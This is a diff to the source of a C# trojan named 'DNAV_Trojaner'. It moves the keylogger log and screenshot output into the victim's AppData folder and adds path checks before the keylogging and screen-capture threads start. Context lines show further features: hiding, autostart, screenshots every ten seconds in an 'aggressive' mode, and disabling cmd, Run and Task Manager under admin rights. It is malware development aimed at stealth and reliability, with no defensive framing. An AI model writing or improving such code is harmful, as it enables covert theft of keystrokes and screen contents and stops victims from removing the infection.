@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Threading;
 using System.Security.Principal;
+using System.IO;
 
 namespace DNAV_Trojaner
 {
@@ -74,7 +75,7 @@ namespace DNAV_Trojaner
             }
             set
             {
-                this._keyloggerLogPath = value != "" ? value : "log.txt";
+                this._keyloggerLogPath = value;
             }
         }
 
@@ -119,7 +120,7 @@ namespace DNAV_Trojaner
             }
             set
             {
-                this._screenshotsPath = value != "" ? value : "screen.png";
+                this._screenshotsPath = value;
             }
         }
 
@@ -236,10 +237,10 @@ namespace DNAV_Trojaner
             this._isAdmin = checkAdmin();
             this.Hide = false;
             this.Keylogger = false;
-            this.KeyloggerLogPath = "log.txt";
+            this.KeyloggerLogPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt";
             this.Autostart = true;
             this.Screenshots = false;
-            this.ScreenshotsPath = "screen.png";
+            this.ScreenshotsPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\screen.png";
             this.ScreenshotsInterval = 180;
             this.DisableCmd = false;
             this.DisableRun = false;
@@ -257,10 +258,10 @@ namespace DNAV_Trojaner
         {
             this.Hide = true;
             this.Keylogger = true;
-            this.KeyloggerLogPath = "log.txt";
+            this.KeyloggerLogPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt";
             this.Autostart = true;
             this.Screenshots = aggressive;
-            this.ScreenshotsPath = "screen.png";
+            this.ScreenshotsPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\screen.png"; ;
             this.ScreenshotsInterval = 10;
             this.DisableCmd = aggressive;
             this.DisableRun = aggressive;
@@ -279,7 +280,7 @@ namespace DNAV_Trojaner
             {
                 DNAV_Trojaner.Keylogger.Hide();
             }
-            if (this.Keylogger)
+            if (this.Keylogger && Path.IsPathRooted(this.KeyloggerLogPath))
             {
                 Thread keylogger = new Thread(() => DNAV_Trojaner.Keylogger.EnableWithLog(this.KeyloggerLogPath));
                 keylogger.Start();
@@ -292,7 +293,7 @@ namespace DNAV_Trojaner
             {
                 Startup.Enable();
             }
-            if (this.Screenshots)
+            if (this.Screenshots && Path.IsPathRooted(this.ScreenshotsPath))
             {
                 ScreenCapture sc = new ScreenCapture();
                 Thread screenshot = new Thread(() => sc.CaptureScreenToFile(this.ScreenshotsPath, System.Drawing.Imaging.ImageFormat.Png, this.ScreenshotsInterval));
@@ -304,7 +305,7 @@ namespace DNAV_Trojaner
             }
             if (this.DisableRun && this._isAdmin)
             {
-                Run.Disbable(); 
+                Run.Disable(); 
             }
             if (this.DisableTaskmanager && this._isAdmin)
             {
